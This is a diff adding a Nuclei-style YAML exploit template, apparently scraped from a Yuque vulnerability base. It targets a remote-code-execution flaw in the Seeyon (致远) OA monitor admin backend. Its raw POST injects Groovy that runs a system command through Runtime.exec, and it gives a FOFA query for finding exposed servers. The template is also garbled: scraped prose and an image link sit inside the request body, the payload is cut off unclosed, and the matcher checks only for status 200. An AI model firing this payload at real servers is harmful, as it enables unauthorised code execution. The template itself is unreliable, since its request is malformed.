@@ -1,0 +1,53 @@
+id: poc-tgrpby3qkkprybq5
+info:
+  name: 致远OA monitor管理员后台任意代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgrpby3qkkprybq5'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgrpby3qkkprybq5
+    fofa: app="致远互联-OA"
+http:
+- raw:
+  - 'POST /seeyon/ctp/sysmgr/monitor/cacheDump.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=1A38B9081A495DF8B8D92E9A5FB8A2BE; loginPageURL=;
+
+    login_locale=en
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 101
+
+    q=groovy&b=partitionManager&m=getPartition&p=100000000000);java.lang.Runtime.getR
+
+    untime().exec(''calc''
+
+
+    **弹出计算器**
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1775532051165-4231a59e-6c34-42e1-a47d-2a6e267abff8.png)
+
+
+    **payload 优化**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
